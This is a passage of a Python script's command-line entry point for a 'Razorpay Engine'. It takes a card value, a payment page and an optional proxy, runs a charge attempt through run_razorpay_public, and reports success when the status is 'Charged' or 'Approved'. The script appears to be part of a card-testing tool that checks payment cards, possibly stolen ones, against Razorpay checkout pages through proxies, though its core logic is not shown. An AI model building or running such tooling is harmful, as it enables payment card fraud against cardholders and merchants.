    proxy = sys.argv[3] if len(sys.argv) > 3 else None
    print(f"\nRazorpay Engine v{VERSION}")
    print(f"  Card:  {card}")
    print(f"  Page:  {page}")
    print(f"  Proxy: {proxy or '(none)'}\n")
    r = run_razorpay_public(page, card, proxy)
    for k, v in r.items():
        print(f"  {k}: {v}")
    try:
        shutdown()
    except Exception:
        pass
    sys.exit(0 if r.get("status") in ("Charged", "Approved") else 1)